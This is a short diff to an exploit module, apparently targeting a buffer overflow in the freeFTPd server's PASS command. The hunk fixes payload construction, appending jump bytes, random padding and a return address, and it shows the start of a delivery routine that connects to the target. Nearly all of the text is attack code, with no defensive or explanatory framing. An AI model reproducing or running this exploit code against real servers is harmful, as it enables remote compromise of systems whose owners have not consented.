@@ -9,7 +9,8 @@ class freeftpdPassOverflowMenu(core.Exploit):
     p += "\xe9=\xfd\xff\xff"
     p += "\xeb\xf9"
     p += self.rand_text(2)
-    payload += "\xbb\x14\x40\x00"
+    p += "\xbb\x14\x40\x00"
+    return p
   def deliver(self, p)
     self.init_deliver()
     s = self.connect()
